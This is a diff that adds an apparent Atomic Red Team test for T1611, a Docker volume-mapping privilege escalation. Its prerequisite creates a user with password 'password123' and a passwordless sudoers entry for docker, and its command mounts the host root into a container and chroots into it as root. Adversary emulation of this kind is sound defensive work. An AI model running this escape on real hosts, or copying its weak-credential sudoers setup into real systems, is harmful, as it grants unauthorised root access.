@@ -143,3 +143,40 @@ atomic_tests:
       rm #{mount_point}#{cron_path}/#{cron_filename}
       umount #{mount_point}
       rmdir #{mount_point}
+- name: Privilege Escalation via Docker Volume Mapping
+  auto_generated_guid: 39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4
+  description: |
+    This test demonstrates privilege escalation by abusing Docker's volume mapping
+    feature to gain access to the host file system. By mounting the root directory
+    of the host into a Docker container, the attacker can use chroot to operate as
+    root on the host system.
+  supported_platforms:
+    - containers
+  input_arguments:
+    username:
+      default: docker_user
+      description: Username that run attack command
+      type: string
+  dependencies:
+    - description: Docker
+      prereq_command: |
+        command -v docker &> /dev/null && echo "Docker is installed" || { echo "Docker is not installed."; exit 1; }
+      get_prereq_command: |
+        echo "You should install docker manually."
+    - description: Docker Privileged User
+      prereq_command: |
+        sudo -l -U #{username} | grep "(ALL) NOPASSWD: /usr/bin/docker"
+      get_prereq_command: |
+        USERNAME="#{username}"
+        PASSWORD="password123"
+        SUDO_COMMAND="/usr/bin/docker"
+        SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
+        [[ $EUID -ne 0 ]] && echo "Run as root." && exit 1; id "$USERNAME" &>/dev/null || { useradd -m -s /bin/bash "$USERNAME" && echo "$USERNAME:$PASSWORD" | chpasswd; }; [[ -f "$SUDOERS_FILE" ]] || { echo "$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND" > "$SUDOERS_FILE" && chmod 440 "$SUDOERS_FILE"; }; echo "Setup complete. User: $USERNAME, Password: $PASSWORD"
+  executor:
+    name: sh
+    elevation_required: true
+    command: |
+      echo "Current user: #{username}"
+      sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
+    cleanup_command: |
+      USERNAME="#{username}"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME"; id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup complete."
